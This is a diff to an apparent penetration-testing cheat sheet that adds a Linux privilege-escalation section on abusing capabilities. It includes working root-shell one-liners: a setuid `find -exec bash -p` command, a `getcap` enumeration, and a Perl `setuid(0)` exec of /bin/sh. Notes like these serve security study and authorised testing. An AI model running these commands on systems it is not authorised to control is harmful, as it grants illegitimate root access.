@@ -157,6 +157,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [NFS](#nfs)
     - [Kernel Exploits](#kernel-exploits)
     - [find with exec](#find-with-exec)
+    - [Abusing capabilities](#abusing-capabilities)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Resources](#resources)
     - [Privileges](#privileges)
@@ -3915,8 +3916,15 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
   - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
 
 #### <ins>find with exec</ins>
-- `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`
+- Also known as "Abusing Setuid Binaries"
+- `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
 - See more here: [find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)
+
+#### <ins>Abusing capabilities</ins>
+- `/usr/sbin/getcap -r / 2>/dev/null` enumerate capabilities
+  - Search for `cap_setuid+ep`, meaning that setuid capabilities are enabled, effective and permitted
+- Search what you need in [GTFOBins](https://gtfobins.github.io/)
+  - Example with Perl: `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
 
 ### <ins>Windows Privilege Escalation</ins>
 
